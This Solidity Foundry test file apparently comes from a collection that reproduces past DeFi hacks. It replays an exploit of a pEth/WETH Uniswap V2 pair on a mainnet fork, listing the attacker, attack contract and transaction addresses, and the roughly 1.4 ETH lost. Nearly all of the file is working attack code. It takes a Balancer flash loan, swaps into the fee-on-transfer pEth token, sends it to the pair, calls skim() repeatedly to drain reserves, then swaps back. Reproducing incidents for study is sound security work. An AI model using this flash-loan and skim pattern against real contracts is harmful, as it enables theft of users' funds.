// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1.4 ETH
// Attacker : https://etherscan.io/address/0xea75aec151f968b8de3789ca201a2a3a7faeefba
// Attack Contract : https://etherscan.io/address/0xf88d1d6d9db9a39dbbfc4b101cecc495bb0636f8
// Vulnerable Contract : https://etherscan.io/address/0x2033b54b6789a963a02bfcbd40a46816770f1161
// Attack Tx : https://etherscan.io/tx/0x4ab68b21799828a57ea99c1288036889b39bf85785240576e697ebff524b3930

// @Analysis
// Twitter Guy : https://twitter.com/CertiKAlert/status/1710979615164944729

contract ContractTest is Test {
    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pEth = IERC20(0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Router UniRouter = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IUniswapV2Pair UNIPair = IUniswapV2Pair(0x2033B54B6789a963A02BfCbd40A46816770f1161);
    uint256 amount = 51_970_861_731_879_316_502_999;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_305_132 - 1);
        vm.label(address(WETH), "WETH");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(UniRouter), "Uniswap V2: Router");
        vm.label(address(UNIPair), "Uniswap V2: pEth");
        approveAll();
    }

    function testExploit() external {
        uint256 startWETH = WETH.balanceOf(address(this));
        console.log("Before Start: %d WETH", startWETH);
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint[](1);
        amounts[0] = amount;
        Balancer.flashLoan(address(this), tokens, amounts, "");

        uint256 intRes = WETH.balanceOf(address(this)) / 1 ether;
        uint256 decRes = WETH.balanceOf(address(this)) - intRes * 1e18;
        console.log("Attack Exploit: %s.%s WETH", intRes, decRes);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        address[] memory path = new address [](2);
        (path[0], path[1]) = (address(WETH), address(pEth));
        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amounts[0], 0, path, address(this), type(uint256).max
        );
        uint256 pEth_amount = pEth.balanceOf(address(this));
        pEth.transfer(address(UNIPair), pEth_amount);

        for (uint256 i = 0; i < 10; i++) {
            UNIPair.skim(address(UNIPair));
        }

        (path[0], path[1]) = (address(pEth), address(WETH));
        pEth_amount = pEth.balanceOf(address(this));
        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            pEth_amount, 0, path, address(this), type(uint256).max
        );

        WETH.transfer(address(Balancer), amount);
    }

    function approveAll() internal {
        WETH.approve(address(UniRouter), type(uint256).max);
        pEth.approve(address(UniRouter), type(uint256).max);
    }
}
